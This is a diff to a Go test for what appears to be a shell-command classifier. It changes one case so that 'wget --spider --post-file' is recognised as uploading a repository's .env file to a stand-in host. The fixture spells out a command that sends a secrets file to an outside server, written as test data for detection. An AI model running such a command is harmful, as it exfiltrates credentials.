@@ -4724,18 +4724,16 @@ func TestCommandSpecificNoEffectPrecedence(t *testing.T) {
 		}
 	})
 
-	t.Run("wget spider does not upload", func(t *testing.T) {
+	t.Run("wget spider still transmits request body", func(t *testing.T) {
 		out := classifyTestArgv([]string{
 			"wget", "--spider", "--post-file=/repo/.env",
 			"https://sink.example/upload",
 		})
 		if out.status != StatusComplete ||
 			out.commands[0].Effect != EffectExecute ||
-			!commandHasOperation(out.commands[0], OperationFetch) ||
-			commandHasOperation(out.commands[0], OperationUpload) ||
-			outputHasAnyPath(out, "/repo/.env") ||
-			!outputHasNetwork(out, NetworkDownload, "sink.example") ||
-			outputHasNetwork(out, NetworkUpload, "sink.example") {
+			!commandHasOperation(out.commands[0], OperationUpload) ||
+			!outputHasAnyPath(out, "/repo/.env") ||
+			!outputHasNetwork(out, NetworkUpload, "sink.example") {
 			t.Fatalf("output = %#v", out)
 		}
 	})
